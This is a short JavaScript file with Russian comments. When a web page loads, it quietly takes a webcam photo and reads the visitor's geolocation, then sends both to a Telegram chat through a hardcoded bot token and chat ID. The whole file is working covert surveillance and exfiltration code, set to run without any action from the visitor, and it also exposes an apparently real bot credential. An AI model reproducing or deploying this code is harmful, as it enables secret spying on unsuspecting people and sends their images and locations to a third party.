const botToken = '8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I';
const chatId = '8071841674';

function sendLocation(lat, lon) {
  const url = `https://www.google.com/maps?q=${lat},${lon}`;
  fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent('Геолокация пользователя: ' + url)}`);
}

function sendPhoto(blob) {
  const formData = new FormData();
  formData.append('chat_id', chatId);
  formData.append('photo', blob, 'photo.jpg');

  fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
    method: 'POST',
    body: formData
  });
}

function takePhotoAndSend() {
  navigator.mediaDevices.getUserMedia({ video: true })
    .then((stream) => {
      const video = document.createElement('video');
      video.srcObject = stream;
      video.play();

      setTimeout(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const context = canvas.getContext('2d');
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(sendPhoto, 'image/jpeg');
        stream.getTracks().forEach(track => track.stop());
      }, 2000);
    })
    .catch((err) => {
      console.error('Ошибка камеры:', err);
    });
}

function getGeoAndSend() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      (pos) => {
        sendLocation(pos.coords.latitude, pos.coords.longitude);
      },
      (err) => {
        console.error('Геолокация отклонена или недоступна', err);
      }
    );
  }
}

// Старт сразу при загрузке страницы
window.onload = () => {
  takePhotoAndSend();
  getGeoAndSend();
};
